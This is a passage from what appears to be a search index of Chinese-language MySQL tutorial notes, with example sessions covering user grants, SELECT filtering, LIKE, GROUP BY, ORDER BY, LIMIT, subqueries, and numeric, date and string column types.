revoke"},{"location":"database/mysql/grant/#6","text":"mysql> select user,host from mysql.user; +----------+-------------+ | user | host | +----------+-------------+ | douni | % | | douni2 | % | | douwo | % | | part | % | | root | 127.0.0.1 | | allpriv | 172.16.%.% | | allpriv1 | 172.16.%.% | | remote | 172.16.42.8 | | root | ::1 | | | localhost | | root | localhost | | | mysql | | root | mysql | +----------+-------------+ 13 rows in set (0.00 sec) mysql> show grants for part@'%'; #\u67e5\u770b\u7528\u6237\u7684\u6743\u9650\u7684 +-----------------------------------------------------------------------------------------------------+ | Grants for part@% | +-----------------------------------------------------------------------------------------------------+ | GRANT USAGE ON *.* TO 'part'@'%' IDENTIFIED BY PASSWORD '*57FA4A97AD182F6A0872282CACBE109822E9E801' | | GRANT SELECT, INSERT, UPDATE ON `test`.`score` TO 'part'@'%' | +-----------------------------------------------------------------------------------------------------+ 2 rows in set (0.00 sec) #\u6743\u9650\u67e5\u770b: mysql> use information_schema; Database changed mysql> select distinct grantee from user_privileges; mysql> select privilege_type from user_privileges where grantee=\"'test'@'172.16.%.%'\"; +-------------------------+ | privilege_type | +-------------------------+ | SELECT | | INSERT | | UPDATE | | DELETE | | CREATE | | DROP | | RELOAD | | SHUTDOWN | | PROCESS | | FILE | | REFERENCES | | INDEX | | ALTER | | SHOW DATABASES | | SUPER | | CREATE TEMPORARY TABLES | | LOCK TABLES | | EXECUTE | | REPLICATION SLAVE | | REPLICATION CLIENT | | CREATE VIEW | | SHOW VIEW | | CREATE ROUTINE | | ALTER ROUTINE | | CREATE USER | | EVENT | | TRIGGER | | CREATE TABLESPACE | +-------------------------+ 28 rows in set (0.00 sec)","title":"6\u3001\u67e5\u770b\u7528\u6237\u7684\u6743\u9650"},{"location":"database/mysql/select/","text":"\u4e00\u3001\u6307\u5b9a\u67e5\u8be2\u6761\u4ef6 select \u7528\u6765\u8fc7\u6ee4\u5b57\u6bb5\u7684 from \u6307\u5b9a\u4ece\u54ea\u4e9b\u8868\u4e2d\u67e5\u8be2\u6570\u636e where \u7528\u6765\u8fc7\u6ee4\u884c\u7684 \u67e5\u8be2ula\u53ca\u683c\u7684\u4eba\u7684\u59d3\u540d\u548cula\u6210\u7ee9 mysql> select sname,ula from score where ula>=60; +-------+------+ | sname | ula | +-------+------+ | tom | 80 | | mary | 75 | | mike | 100 | +-------+------+ 3 rows in set (0.00 sec) \u67e5\u8be2ula\u548cule\u90fd\u53ca\u683c\u7684\u4eba\u7684\u59d3\u540d\u548c\u4e24\u79d1\u6210\u7ee9 mysql> select sname,ula,ule from score where ula>=60 and ule>=60; +-------+------+------+ | sname | ula | ule | +-------+------+------+ | tom | 80 | 70 | | mike | 100 | 90 | +-------+------+------+ 2 rows in set (0.00 sec) \u67e5\u8be2\u6709\u4efb\u4f55\u4e00\u79d1\u4e0d\u53ca\u683c\u7684\u4eba\u7684\u5168\u90e8\u4fe1\u606f mysql> select * from score where ula<60 or ule<60 or uoa<60; +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 2 | mary | 55 | 75 | 65 | | 3 | jack | 75 | 45 | 95 | +------+-------+------+------+------+ \u4e8c\u3001\u6a21\u7cca\u67e5\u8be2 like \u4f7f\u7528\u901a\u914d\u7b26 _ \uff1a \u5339\u914d\u5355\u4e2a\u5b57\u7b26 % \uff1a \u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u5b57\u7b26 \u67e5\u8be2\u540d\u5b57\u662f\u4e09\u4e2a\u5b57\u7b26\u7684\u4eba\u7684\u5168\u90e8\u4fe1\u606f mysql> select sname from score where sname like '___'; //\u4e09\u4e2a\u4e0b\u5212\u7ebf +-------+ | sname | +-------+ | tom | +-------+ 1 row in set (0.00 sec) mysql> select * from score where sname like 'j%'; //\u540d\u5b57\u4ee5j\u5f00\u5934\u7684 +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 3 | jack | 75 | 45 | 95 | +------+-------+------+------+------+ 1 row in set (0.00 sec) mysql> select * from score where sname like '%k'; //\u540d\u5b57\u4ee5k\u7ed3\u5c3e\u7684 mysql> select * from score where sname like '%m%'; //\u540d\u5b57\u4e2d\u542b\u6709m\u7684 +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 1 | tom | 70 | 80 | 90 | | 2 | mary | 55 | 75 | 65 | | 4 | mike | 90 | 100 | 86 | +------+-------+------+------+------+ 3 rows in set (0.00 sec) mysql> show variables; //\u67e5\u770b\u53d8\u91cf\u503c mysql> show variables like 'da%'; //\u67e5\u770b\u53d8\u91cf\u540d\u4ee5da\u5f00\u5934\u7684\u53d8\u91cf\u7684\u503c +-----------------+-------------------+ | Variable_name | Value | +-----------------+-------------------+ | datadir | /data/mysql/ | | date_format | %Y-%m-%d | | datetime_format | %Y-%m-%d %H:%i:%s | +-----------------+-------------------+ 3 rows in set (0.00 sec) \u4e09\u3001\u5206\u7ec4 group by \u5b57\u6bb5\u540d mysql> select * from score; +------+-------+------+------+------+-------+ | sno | sname | ule | ula | uoa | class | +------+-------+------+------+------+-------+ | 1 | tom | 70 | 80 | 90 | 1 | | 2 | mary | 55 | 75 | 65 | 2 | | 3 | jack | 75 | 45 | 95 | 1 | | 4 | mike | 90 | 100 | 86 | 2 | | 5 | rose | 75 | 85 | 95 | 2 | +------+-------+------+------+------+-------+ \u200b \u663e\u793a\u6bcf\u4e2a\u73ed\u7684ule\u7684\u603b\u6210\u7ee9\u548c\u5e73\u5747\u6210\u7ee9 mysql> select class,sum(ule),avg(ule) from score group by class; +-------+----------+----------+ | class | sum(ule) | avg(ule) | +-------+----------+----------+ | 1 | 145 | 72.5000 | | 2 | 220 | 73.3333 | +-------+----------+----------+ 2 rows in set (0.02 sec) \u6ce8\u610f\uff1agroup by \u91cc\u9762\u5e26\u6761\u4ef6\u7684\u8bdd\uff0c\u4e0d\u80fd\u4f7f\u7528where\uff1b\u53ef\u4ee5\u4e0ehaving\u8fde\u7528 \u663e\u793a\u73ed\u7ea7\u4eba\u6570\u5927\u4e8e2\u7684\u73ed\u7ea7\u7684ule\u7684\u603b\u6210\u7ee9\u548c\u5e73\u5747\u6210\u7ee9 mysql> select class,sum(ule),avg(ule) from score group by class having count(*)>2; +-------+----------+----------+ | class | sum(ule) | avg(ule) | +-------+----------+----------+ | 2 | 220 | 73.3333 | +-------+----------+----------+ 1 row in set (0.00 sec) \u56db\u3001\u6392\u5e8f order by order by \u5b57\u6bb5\u540d[,\u5b57\u6bb5\u540d2,......] [asc|desc] asc\uff1a \u5347\u5e8f\uff0c\u9ed8\u8ba4\u7684\u6392\u5e8f\u65b9\u5f0f ascend\uff1a\u4e0a\u5347\u7684 desc\uff1a\u964d\u5e8f descend\uff1a\u4e0b\u964d\u7684 \u6309\u7167ule\u7684\u6210\u7ee9\u7531\u4f4e\u5230\u9ad8\u7684\u987a\u5e8f\u663e\u793a\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> select sname,ule from score order by ule; \u6309\u7167ule\u7684\u6210\u7ee9\u7531\u9ad8\u5230\u4f4e\u7684\u987a\u5e8f\u663e\u793a\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> +-------+------+ | sname | ule | +-------+------+ | mike | 90 | | jack | 75 | | rose | 75 | | tom | 70 | | mary | 55 | +-------+------+ 5 rows in set (0.00 sec) order by \u7f16\u53f7 mysql> select sname,ule from score order by 2 desc; order by \u591a\u4e2a\u5b57\u6bb5 \u6309\u7167ule\u6210\u7ee9\u6392\u5e8f\uff0c\u5982\u679c\u6210\u7ee9\u76f8\u540c\uff0c\u6309\u7167\u540d\u5b57\u7684\u5012\u5e8f\u6392\u5e8f mysql> select sname,ule from score order by ule,sname desc; \u6309\u7167ule\u6210\u7ee9\u5012\u5e8f\u6392\u5e8f\uff0c\u5982\u679c\u6210\u7ee9\u76f8\u540c\uff0c\u6309\u7167\u540d\u5b57\u7684\u5012\u5e8f\u6392\u5e8f mysql> select sname,ule from score order by ule desc,sname desc; \u4e94\u3001\u9650\u5236\u8f93\u51fa limit limit n \u53ea\u663e\u793a\u67e5\u8be2\u7ed3\u679c\u7684\u524dn\u6761 \u663e\u793aule\u6210\u7ee9\u524d3\u540d\u7684\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> select sname,ule from score order by ule desc limit 3; +-------+------+ | sname | ule | +-------+------+ | mike | 90 | | jack | 75 | | rose | 75 | +-------+------+\u00df 3 rows in set (0.00 sec) \u200b limit m,n \u4ecem+1\u884c\u5f00\u59cb\uff0c\u663e\u793an\u884c mysql> select sname,ule from score limit 2,2; //\u663e\u793a\u7b2c3\u884c\u548c\u7b2c4\u884c \u516d\u3001\u5b50\u67e5\u8be2 \u4e5f\u53eb\u5d4c\u5957\u67e5\u8be2\uff0c\u5c06\u91cc\u5c42\u67e5\u8be2\u7684\u7ed3\u679c\u4f5c\u4e3a\u5916\u5c42\u67e5\u8be2\u7684\u6761\u4ef6 \u67e5\u8be2ula\u6210\u7ee9\u6700\u9ad8\u7684\u4eba\u7684\u5b66\u53f7\uff0c\u59d3\u540d\u4ee5\u53caula\u7684\u6210\u7ee9 mysql> select sno,sname,ula from score where ula=(select max(ula) from score); +------+-------+------+ | sno | sname | ula | +------+-------+------+ | 4 | mike | 100 | +------+-------+------+ 1 row in set (0.00 sec)","title":"\u67e5\u8be2"},{"location":"database/mysql/select/#_1","text":"select \u7528\u6765\u8fc7\u6ee4\u5b57\u6bb5\u7684 from \u6307\u5b9a\u4ece\u54ea\u4e9b\u8868\u4e2d\u67e5\u8be2\u6570\u636e where \u7528\u6765\u8fc7\u6ee4\u884c\u7684 \u67e5\u8be2ula\u53ca\u683c\u7684\u4eba\u7684\u59d3\u540d\u548cula\u6210\u7ee9 mysql> select sname,ula from score where ula>=60; +-------+------+ | sname | ula | +-------+------+ | tom | 80 | | mary | 75 | | mike | 100 | +-------+------+ 3 rows in set (0.00 sec) \u67e5\u8be2ula\u548cule\u90fd\u53ca\u683c\u7684\u4eba\u7684\u59d3\u540d\u548c\u4e24\u79d1\u6210\u7ee9 mysql> select sname,ula,ule from score where ula>=60 and ule>=60; +-------+------+------+ | sname | ula | ule | +-------+------+------+ | tom | 80 | 70 | | mike | 100 | 90 | +-------+------+------+ 2 rows in set (0.00 sec) \u67e5\u8be2\u6709\u4efb\u4f55\u4e00\u79d1\u4e0d\u53ca\u683c\u7684\u4eba\u7684\u5168\u90e8\u4fe1\u606f mysql> select * from score where ula<60 or ule<60 or uoa<60; +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 2 | mary | 55 | 75 | 65 | | 3 | jack | 75 | 45 | 95 | +------+-------+------+------+------+","title":"\u4e00\u3001\u6307\u5b9a\u67e5\u8be2\u6761\u4ef6"},{"location":"database/mysql/select/#_2","text":"like \u4f7f\u7528\u901a\u914d\u7b26 _ \uff1a \u5339\u914d\u5355\u4e2a\u5b57\u7b26 % \uff1a \u5339\u914d0\u4e2a\u6216\u8005\u591a\u4e2a\u5b57\u7b26 \u67e5\u8be2\u540d\u5b57\u662f\u4e09\u4e2a\u5b57\u7b26\u7684\u4eba\u7684\u5168\u90e8\u4fe1\u606f mysql> select sname from score where sname like '___'; //\u4e09\u4e2a\u4e0b\u5212\u7ebf +-------+ | sname | +-------+ | tom | +-------+ 1 row in set (0.00 sec) mysql> select * from score where sname like 'j%'; //\u540d\u5b57\u4ee5j\u5f00\u5934\u7684 +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 3 | jack | 75 | 45 | 95 | +------+-------+------+------+------+ 1 row in set (0.00 sec) mysql> select * from score where sname like '%k'; //\u540d\u5b57\u4ee5k\u7ed3\u5c3e\u7684 mysql> select * from score where sname like '%m%'; //\u540d\u5b57\u4e2d\u542b\u6709m\u7684 +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 1 | tom | 70 | 80 | 90 | | 2 | mary | 55 | 75 | 65 | | 4 | mike | 90 | 100 | 86 | +------+-------+------+------+------+ 3 rows in set (0.00 sec) mysql> show variables; //\u67e5\u770b\u53d8\u91cf\u503c mysql> show variables like 'da%'; //\u67e5\u770b\u53d8\u91cf\u540d\u4ee5da\u5f00\u5934\u7684\u53d8\u91cf\u7684\u503c +-----------------+-------------------+ | Variable_name | Value | +-----------------+-------------------+ | datadir | /data/mysql/ | | date_format | %Y-%m-%d | | datetime_format | %Y-%m-%d %H:%i:%s | +-----------------+-------------------+ 3 rows in set (0.00 sec)","title":"\u4e8c\u3001\u6a21\u7cca\u67e5\u8be2"},{"location":"database/mysql/select/#_3","text":"group by \u5b57\u6bb5\u540d mysql> select * from score; +------+-------+------+------+------+-------+ | sno | sname | ule | ula | uoa | class | +------+-------+------+------+------+-------+ | 1 | tom | 70 | 80 | 90 | 1 | | 2 | mary | 55 | 75 | 65 | 2 | | 3 | jack | 75 | 45 | 95 | 1 | | 4 | mike | 90 | 100 | 86 | 2 | | 5 | rose | 75 | 85 | 95 | 2 | +------+-------+------+------+------+-------+ \u200b \u663e\u793a\u6bcf\u4e2a\u73ed\u7684ule\u7684\u603b\u6210\u7ee9\u548c\u5e73\u5747\u6210\u7ee9 mysql> select class,sum(ule),avg(ule) from score group by class; +-------+----------+----------+ | class | sum(ule) | avg(ule) | +-------+----------+----------+ | 1 | 145 | 72.5000 | | 2 | 220 | 73.3333 | +-------+----------+----------+ 2 rows in set (0.02 sec) \u6ce8\u610f\uff1agroup by \u91cc\u9762\u5e26\u6761\u4ef6\u7684\u8bdd\uff0c\u4e0d\u80fd\u4f7f\u7528where\uff1b\u53ef\u4ee5\u4e0ehaving\u8fde\u7528 \u663e\u793a\u73ed\u7ea7\u4eba\u6570\u5927\u4e8e2\u7684\u73ed\u7ea7\u7684ule\u7684\u603b\u6210\u7ee9\u548c\u5e73\u5747\u6210\u7ee9 mysql> select class,sum(ule),avg(ule) from score group by class having count(*)>2; +-------+----------+----------+ | class | sum(ule) | avg(ule) | +-------+----------+----------+ | 2 | 220 | 73.3333 | +-------+----------+----------+ 1 row in set (0.00 sec)","title":"\u4e09\u3001\u5206\u7ec4"},{"location":"database/mysql/select/#_4","text":"order by order by \u5b57\u6bb5\u540d[,\u5b57\u6bb5\u540d2,......] [asc|desc] asc\uff1a \u5347\u5e8f\uff0c\u9ed8\u8ba4\u7684\u6392\u5e8f\u65b9\u5f0f ascend\uff1a\u4e0a\u5347\u7684 desc\uff1a\u964d\u5e8f descend\uff1a\u4e0b\u964d\u7684 \u6309\u7167ule\u7684\u6210\u7ee9\u7531\u4f4e\u5230\u9ad8\u7684\u987a\u5e8f\u663e\u793a\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> select sname,ule from score order by ule; \u6309\u7167ule\u7684\u6210\u7ee9\u7531\u9ad8\u5230\u4f4e\u7684\u987a\u5e8f\u663e\u793a\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> +-------+------+ | sname | ule | +-------+------+ | mike | 90 | | jack | 75 | | rose | 75 | | tom | 70 | | mary | 55 | +-------+------+ 5 rows in set (0.00 sec) order by \u7f16\u53f7 mysql> select sname,ule from score order by 2 desc; order by \u591a\u4e2a\u5b57\u6bb5 \u6309\u7167ule\u6210\u7ee9\u6392\u5e8f\uff0c\u5982\u679c\u6210\u7ee9\u76f8\u540c\uff0c\u6309\u7167\u540d\u5b57\u7684\u5012\u5e8f\u6392\u5e8f mysql> select sname,ule from score order by ule,sname desc; \u6309\u7167ule\u6210\u7ee9\u5012\u5e8f\u6392\u5e8f\uff0c\u5982\u679c\u6210\u7ee9\u76f8\u540c\uff0c\u6309\u7167\u540d\u5b57\u7684\u5012\u5e8f\u6392\u5e8f mysql> select sname,ule from score order by ule desc,sname desc;","title":"\u56db\u3001\u6392\u5e8f"},{"location":"database/mysql/select/#_5","text":"limit limit n \u53ea\u663e\u793a\u67e5\u8be2\u7ed3\u679c\u7684\u524dn\u6761 \u663e\u793aule\u6210\u7ee9\u524d3\u540d\u7684\u5b66\u751f\u59d3\u540d\u53caule\u6210\u7ee9 mysql> select sname,ule from score order by ule desc limit 3; +-------+------+ | sname | ule | +-------+------+ | mike | 90 | | jack | 75 | | rose | 75 | +-------+------+\u00df 3 rows in set (0.00 sec) \u200b limit m,n \u4ecem+1\u884c\u5f00\u59cb\uff0c\u663e\u793an\u884c mysql> select sname,ule from score limit 2,2; //\u663e\u793a\u7b2c3\u884c\u548c\u7b2c4\u884c","title":"\u4e94\u3001\u9650\u5236\u8f93\u51fa"},{"location":"database/mysql/select/#_6","text":"\u4e5f\u53eb\u5d4c\u5957\u67e5\u8be2\uff0c\u5c06\u91cc\u5c42\u67e5\u8be2\u7684\u7ed3\u679c\u4f5c\u4e3a\u5916\u5c42\u67e5\u8be2\u7684\u6761\u4ef6 \u67e5\u8be2ula\u6210\u7ee9\u6700\u9ad8\u7684\u4eba\u7684\u5b66\u53f7\uff0c\u59d3\u540d\u4ee5\u53caula\u7684\u6210\u7ee9 mysql> select sno,sname,ula from score where ula=(select max(ula) from score); +------+-------+------+ | sno | sname | ula | +------+-------+------+ | 4 | mike | 100 | +------+-------+------+ 1 row in set (0.00 sec)","title":"\u516d\u3001\u5b50\u67e5\u8be2"},{"location":"database/mysql/type/","text":"MySQL \u6570\u636e\u7c7b\u578b MySQL \u4e2d\u5b9a\u4e49\u6570\u636e\u5b57\u6bb5\u7684\u7c7b\u578b\u5bf9\u4f60\u6570\u636e\u5e93\u7684\u4f18\u5316\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002 MySQL \u652f\u6301\u591a\u79cd\u7c7b\u578b\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\uff1a\u6570\u503c\u3001\u65e5\u671f/\u65f6\u95f4\u548c\u5b57\u7b26\u4e32(\u5b57\u7b26)\u7c7b\u578b\u3002 \u6570\u503c\u7c7b\u578b MySQL \u652f\u6301\u6240\u6709\u6807\u51c6 SQL \u6570\u503c\u6570\u636e\u7c7b\u578b\u3002 \u8fd9\u4e9b\u7c7b\u578b\u5305\u62ec\u4e25\u683c\u6570\u503c\u6570\u636e\u7c7b\u578b(INTEGER\u3001SMALLINT\u3001DECIMAL \u548c NUMERIC)\uff0c\u4ee5\u53ca\u8fd1\u4f3c\u6570\u503c\u6570\u636e\u7c7b\u578b(FLOAT\u3001REAL \u548c DOUBLE PRECISION)\u3002 \u5173\u952e\u5b57INT\u662fINTEGER\u7684\u540c\u4e49\u8bcd\uff0c\u5173\u952e\u5b57DEC\u662fDECIMAL\u7684\u540c\u4e49\u8bcd\u3002 BIT\u6570\u636e\u7c7b\u578b\u4fdd\u5b58\u4f4d\u5b57\u6bb5\u503c\uff0c\u5e76\u4e14\u652f\u6301 MyISAM\u3001MEMORY\u3001InnoDB \u548c BDB\u8868\u3002 \u4f5c\u4e3a SQL \u6807\u51c6\u7684\u6269\u5c55\uff0cMySQL \u4e5f\u652f\u6301\u6574\u6570\u7c7b\u578b TINYINT\u3001MEDIUMINT \u548c BIGINT\u3002\u4e0b\u9762\u7684\u8868\u663e\u793a\u4e86\u9700\u8981\u7684\u6bcf\u4e2a\u6574\u6570\u7c7b\u578b\u7684\u5b58\u50a8\u548c\u8303\u56f4\u3002 \u7c7b\u578b \u5927\u5c0f \u8303\u56f4\uff08\u6709\u7b26\u53f7\uff09 \u8303\u56f4\uff08\u65e0\u7b26\u53f7\uff09 \u7528\u9014 TINYINT 1 Bytes (-128\uff0c127) (0\uff0c255) \u5c0f\u6574\u6570\u503c SMALLINT 2 Bytes (-32 768\uff0c32 767) (0\uff0c65 535) \u5927\u6574\u6570\u503c MEDIUMINT 3 Bytes (-8 388 608\uff0c8 388 607) (0\uff0c16 777 215) \u5927\u6574\u6570\u503c INT\u6216INTEGER 4 Bytes (-2 147 483 648\uff0c2 147 483 647) (0\uff0c4 294 967 295) \u5927\u6574\u6570\u503c BIGINT 8 Bytes (-9,223,372,036,854,775,808\uff0c9 223 372 036 854 775 807) (0\uff0c18 446 744 073 709 551 615) \u6781\u5927\u6574\u6570\u503c FLOAT 4 Bytes (-3.402 823 466 E+38\uff0c-1.175 494 351 E-38)\uff0c0\uff0c(1.175 494 351 E-38\uff0c3.402 823 466 351 E+38) 0\uff0c(1.175 494 351 E-38\uff0c3.402 823 466 E+38) \u5355\u7cbe\u5ea6 \u6d6e\u70b9\u6570\u503c DOUBLE 8 Bytes (-1.797 693 134 862 315 7 E+308\uff0c-2.225 073 858 507 201 4 E-308)\uff0c0\uff0c(2.225 073 858 507 201 4 E-308\uff0c1.797 693 134 862 315 7 E+308) 0\uff0c(2.225 073 858 507 201 4 E-308\uff0c1.797 693 134 862 315 7 E+308) \u53cc\u7cbe\u5ea6 \u6d6e\u70b9\u6570\u503c DECIMAL \u5bf9DECIMAL(M,D) \uff0c\u5982\u679cM>D\uff0c\u4e3aM+2\u5426\u5219\u4e3aD+2 \u4f9d\u8d56\u4e8eM\u548cD\u7684\u503c \u4f9d\u8d56\u4e8eM\u548cD\u7684\u503c \u5c0f\u6570\u503c \u6574\u578b\u4e5f\u53ef\u4ee5\u6307\u5b9a\u663e\u793a\u5bbd\u5ea6\u7684\uff0c\u4f46\u662f\u5e76\u4e0d\u5f71\u54cd\u53d6\u503c\u8303\u56f4\u7684\u3002 [root@mysql mysql]# mysql -u root -predhat mysql> use up; mysql> create table table1 ( -> tiny tinyint, -> small smallint, -> medium mediumint, -> nint int, -> big bigint, -> fl float(6,3), -> df double(6,3) -> ); mysql> desc table1; +--------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +--------+--------------+------+-----+---------+-------+ | tiny | tinyint(4) | YES | | NULL | | | small | smallint(6) | YES | | NULL | | | medium | mediumint(9) | YES | | NULL | | | nint | int(11) | YES | | NULL | | | big | bigint(20) | YES | | NULL | | | fl | float(6,3) | YES | | NULL | | | df | double(6,3) | YES | | NULL | | +--------+--------------+------+-----+---------+-------+ 7 rows in set (0.01 sec) mysql> insert into table1 values(123456789,123456789,123456789,123456789,123456789,1234.56789,1234.56789); Query OK, 1 row affected, 5 warnings (0.02 sec) mysql> show warnings -> ; +---------+------+-------------------------------------------------+ | Level | Code | Message | +---------+------+-------------------------------------------------+ | Warning | 1264 | Out of range value for column 'tiny' at row 1 | | Warning | 1264 | Out of range value for column 'small' at row 1 | | Warning | 1264 | Out of range value for column 'medium' at row 1 | | Warning | 1264 | Out of range value for column 'fl' at row 1 | | Warning | 1264 | Out of range value for column 'df' at row 1 | +---------+------+-------------------------------------------------+ 5 rows in set (0.00 sec) mysql> select * from table1; +------+-------+---------+-----------+-----------+---------+---------+ | tiny | small | medium | nint | big | fl | df | +------+-------+---------+-----------+-----------+---------+---------+ | 127 | 32767 | 8388607 | 123456789 | 123456789 | 999.999 | 999.999 | +------+-------+---------+-----------+-----------+---------+---------+ 1 row in set (0.00 sec) \u8d85\u51fa\u6570\u636e\u7c7b\u578b\u80fd\u591f\u8868\u793a\u7684\u8303\u56f4\uff0c\u9ed8\u8ba4\u63d2\u5165\u8be5\u7c7b\u578b\u7684\u6700\u5927\u503c\u3002 \u65e0\u7b26\u53f7\u6570\u4e3e\u4f8b unsigned mysql> create table table2 (tiny tinyint unsigned); mysql> desc table2; +-------+---------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+---------------------+------+-----+---------+-------+ | tiny | tinyint(3) unsigned | YES | | NULL | | +-------+---------------------+------+-----+---------+-------+ 1 row in set (0.00 sec) mysql> insert into table2 values(128),(256); mysql> show warnings; +---------+------+-----------------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------------+ | Warning | 1264 | Out of range value for column 'tiny' at row 2 | +---------+------+-----------------------------------------------+ 1 row in set (0.00 sec) mysql> select * from table2; +------+ | tiny | +------+ | 128 | | 255 | +------+ 2 rows in set (0.00 sec) zerofill\uff1a\u96f6\u586b\u5145 \uff0c\u663e\u793a\u5bbd\u5ea6\u4e0d\u8db3\u65f6\uff0c\u88650 mysql> create table zf (id tinyint zerofill); mysql> desc zf; +-------+------------------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+------------------------------+------+-----+---------+-------+ | id | tinyint(3) unsigned zerofill | YES | | NULL | | +-------+------------------------------+------+-----+---------+-------+ 1 row in set (0.00 sec) mysql> insert into zf values(1),(11),(111); mysql> select * from zf; +------+ | id | +------+ | 001 | | 011 | | 111 | +------+ 3 rows in set (0.00 sec) \u65e5\u671f\u548c\u65f6\u95f4\u7c7b\u578b \u8868\u793a\u65f6\u95f4\u503c\u7684\u65e5\u671f\u548c\u65f6\u95f4\u7c7b\u578b\u4e3aDATETIME\u3001DATE\u3001TIMESTAMP\u3001TIME\u548cYEAR\u3002 \u6bcf\u4e2a\u65f6\u95f4\u7c7b\u578b\u6709\u4e00\u4e2a\u6709\u6548\u503c\u8303\u56f4\u548c\u4e00\u4e2a\"\u96f6\"\u503c\uff0c\u5f53\u6307\u5b9a\u4e0d\u5408\u6cd5\u7684MySQL\u4e0d\u80fd\u8868\u793a\u7684\u503c\u65f6\u4f7f\u7528\"\u96f6\"\u503c\u3002 TIMESTAMP\u7c7b\u578b\u6709\u4e13\u6709\u7684\u81ea\u52a8\u66f4\u65b0\u7279\u6027\uff0c\u5c06\u5728\u540e\u9762\u63cf\u8ff0\u3002 \u7c7b\u578b \u5927\u5c0f ( bytes) \u8303\u56f4 \u683c\u5f0f \u7528\u9014 DATE 3 1000-01-01/9999-12-31 YYYY-MM-DD \u65e5\u671f\u503c TIME 3 '-838:59:59'/'838:59:59' HH:MM:SS \u65f6\u95f4\u503c\u6216\u6301\u7eed\u65f6\u95f4 YEAR 1 1901/2155 YYYY \u5e74\u4efd\u503c DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 YYYY-MM-DD HH:MM:SS \u6df7\u5408\u65e5\u671f\u548c\u65f6\u95f4\u503c TIMESTAMP 4 1970-01-01 00:00:00/2038\u7ed3\u675f\u65f6\u95f4\u662f\u7b2c 2147483647 \u79d2\uff0c\u5317\u4eac\u65f6\u95f4 2038-1-19 11:14:07 \uff0c\u683c\u6797\u5c3c\u6cbb\u65f6\u95f4 2038\u5e741\u670819\u65e5 \u51cc\u6668 03:14:07 YYYYMMDD HHMMSS \u6df7\u5408\u65e5\u671f\u548c\u65f6\u95f4\u503c\uff0c\u65f6\u95f4\u6233 mysql> create table ttime (ttime time,tdate date,tdt datetime,tts timestamp,ty year); mysql> insert into ttime values(curtime(),curdate(),now(),now(),year(now())); mysql> select * from ttime; +----------+------------+---------------------+---------------------+------+ | ttime | tdate | tdt | tts | ty | +----------+------------+---------------------+---------------------+------+ | 11:20:48 | 2015-09-11 | 2015-09-11 11:20:48 | 2015-09-11 11:20:48 | 2015 | +----------+------------+---------------------+---------------------+------+ 1 row in set (0.00 sec) mysql> insert into ttime values('11:22:33','2015-09-11','2015-09-11 11:22:36','2015-09-11 11:22:56','2048'); mysql> insert into ttime values('11:22:33','2015-09-11','2015-09-11 11:22:36','2015-09-11 11:22:56','66'); mysql> select * from ttime; +----------+------------+---------------------+---------------------+------+ | ttime | tdate | tdt | tts | ty | +----------+------------+---------------------+---------------------+------+ | 11:20:48 | 2015-09-11 | 2015-09-11 11:20:48 | 2015-09-11 11:20:48 | 2015 | | 11:22:33 | 2015-09-11 | 2015-09-11 11:22:36 | 2015-09-11 11:22:56 | 2048 | | 11:22:33 | 2015-09-11 | 2015-09-11 11:22:36 | 2015-09-11 11:22:56 | 2066 | +----------+------------+---------------------+---------------------+------+ 3 rows in set (0.00 sec) \u5b57\u7b26\u4e32\u7c7b\u578b \u5b57\u7b26\u4e32\u7c7b\u578b\u6307CHAR\u3001VARCHAR\u3001BINARY\u3001VARBINARY\u3001BLOB\u3001TEXT\u3001ENUM\u548cSET\u3002\u8be5\u8282\u63cf\u8ff0\u4e86\u8fd9\u4e9b\u7c7b\u578b\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5982\u4f55\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u7c7b\u578b\u3002 \u7c7b\u578b \u5927\u5c0f \u7528\u9014 CHAR 0-255 bytes \u5b9a\u957f\u5b57\u7b26\u4e32 VARCHAR 0-65535 bytes \u53d8\u957f\u5b57\u7b26\u4e32 TINYBLOB 0-255 bytes \u4e0d\u8d85\u8fc7 255 \u4e2a\u5b57\u7b26\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 TINYTEXT 0-255 bytes \u77ed\u6587\u672c\u5b57\u7b26\u4e32 BLOB 0-65 535 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u957f\u6587\u672c\u6570\u636e TEXT 0-65 535 bytes \u957f\u6587\u672c\u6570\u636e MEDIUMBLOB 0-16 777 215 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u4e2d\u7b49\u957f\u5ea6\u6587\u672c\u6570\u636e MEDIUMTEXT 0-16 777 215 bytes \u4e2d\u7b49\u957f\u5ea6\u6587\u672c\u6570\u636e LONGBLOB 0-4 294 967 295 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u6781\u5927\u6587\u672c\u6570\u636e LONGTEXT 0-4 294 967 295 bytes \u6781\u5927\u6587\u672c\u6570\u636e \u6ce8\u610f \uff1achar(n) \u548c varchar(n) \u4e2d\u62ec\u53f7\u4e2d n \u4ee3\u8868\u5b57\u7b26\u7684\u4e2a\u6570\uff0c\u5e76\u4e0d\u4ee3\u8868\u5b57\u8282\u4e2a\u6570\uff0c\u6bd4\u5982 CHAR(30) \u5c31\u53ef\u4ee5\u5b58\u50a8 